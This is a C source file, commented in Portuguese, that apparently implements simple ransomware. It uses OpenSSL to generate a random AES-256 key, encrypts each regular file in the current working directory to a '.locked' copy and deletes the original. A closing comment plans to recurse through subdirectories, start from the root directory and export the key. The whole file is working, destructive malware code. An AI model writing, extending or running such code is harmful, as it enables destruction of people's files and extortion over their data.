#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/evp.h>  //pra algoritmos e criptografia
#include <openssl/rand.h> //random num para criptografia
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>

#define KEY_SIZE 32
#define BLOCK_SIZE 16

void enF(const char *filename, const unsigned char *key, const unsigned char *iv) // cript file
{
    FILE *input = fopen(filename, "rb");
    if (!input)
    {
        perror("!!");
        return;
    }

    char encryptedFile[256];
    snprintf(encryptedFile, sizeof(encryptedFile), "%s.locked", filename); // pega o nome do arquivo e acrescenta um .locked

    FILE *output = fopen(encryptedFile, "wb"); // abre o arquivo com permissao de escrita(em binario)
    if (!output)
    {
        perror("!!");
        fclose(input);
        return;
    }

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();                // ponteiro pra esse struct(contem diversas op de crip e descrip) criamos o contexto pra criptografia
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv); // inicializa para criptografar

    unsigned char buffer[1024];
    unsigned char encrypted_buffer[1024 + BLOCK_SIZE];
    int bytes_read, encrypted_bytes;

    while ((bytes_read = fread(buffer, 1, sizeof(buffer), input)) > 0)
    {
        EVP_EncryptUpdate(ctx, encrypted_buffer, &encrypted_bytes, buffer, bytes_read); // criptografa
        fwrite(encrypted_buffer, 1, encrypted_bytes, output);
    }

    EVP_EncryptFinal_ex(ctx, encrypted_buffer, &encrypted_bytes); // finaliza cript
    fwrite(encrypted_buffer, 1, encrypted_bytes, output);

    EVP_CIPHER_CTX_free(ctx); // libera contexto
    fclose(input);
    fclose(output);

    remove(filename);
    printf("Encrypted file %s\n", encryptedFile);
}

void enDire(const char *directory, const unsigned char *key, const unsigned char *iv)
{
    DIR *dir = opendir(directory);
    if (!dir)
    {
        perror("!!");
        return;
    }

    struct dirent *entry;

    while ((entry = readdir(dir)) != NULL)
    {
        // Ignora "." e ".."
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        char filepath[512];
        snprintf(filepath, sizeof(filepath), "%s/%s", directory, entry->d_name);

        struct stat st;
        if (stat(filepath, &st) == 0 && S_ISREG(st.st_mode))
        {
            if (strstr(entry->d_name, ".locked") == NULL)
            {
                enF(filepath, key, iv);
            }
        }
    }

    closedir(dir);
}

int main()
{
    unsigned char key[KEY_SIZE];
    unsigned char iv[BLOCK_SIZE]; // initialization vector(random)

    if (!RAND_bytes(key, sizeof(key)) || !RAND_bytes(iv, sizeof(iv)))
    {
        fprintf(stderr, "err generating iv or key");
        return 1;
    }

    printf("key AES: ");

    for (int i = 0; i < KEY_SIZE; i++)
        printf("%02x", key[i]);
    printf("\n");

    char target_directory[1024];

    getcwd(target_directory, sizeof(target_directory));

    printf("%s", target_directory);
    enDire(target_directory, key, iv);

    return 0;
}

// melhorias: exportar a chave de criptografia, fazer recurssão enquanto existir diretório,
// substituir o diretório atual pelo raiz